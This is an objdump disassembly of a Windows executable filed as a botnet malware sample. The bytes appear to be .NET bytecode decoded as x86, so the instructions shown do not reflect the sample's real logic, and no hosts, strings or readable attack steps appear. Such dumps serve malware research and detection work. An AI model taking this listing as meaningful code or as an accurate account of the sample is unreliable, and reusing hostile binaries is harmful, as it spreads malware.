
malware_samples/botnet/35aff05743c6e65da760746c2836f482fa349fec7ba1af7ae31338c648563014.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	40                   	inc    %eax
  402001:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 fc 59 00       	add    $0x59fc00,%eax
  402013:	00 10                	add    %dl,(%eax)
  402015:	6d                   	insl   (%dx),%es:(%edi)
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	9a 25 00 70 7e 10 00 	lcall  $0x10,$0x7e700025
  4021d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 4e 21 00       	and    $0x214e72,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 46                	jb     0x40223c
  4021f6:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 4e 21 00       	and    $0x214e72,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 58                	jb     0x40227e
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 58 26 00       	and    $0x265872,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 48             	add    %dh,0x48(%edx)
  4024e4:	21 00                	and    %eax,(%eax)
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
  4025e6:	7a 03                	jp     0x4025eb
  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
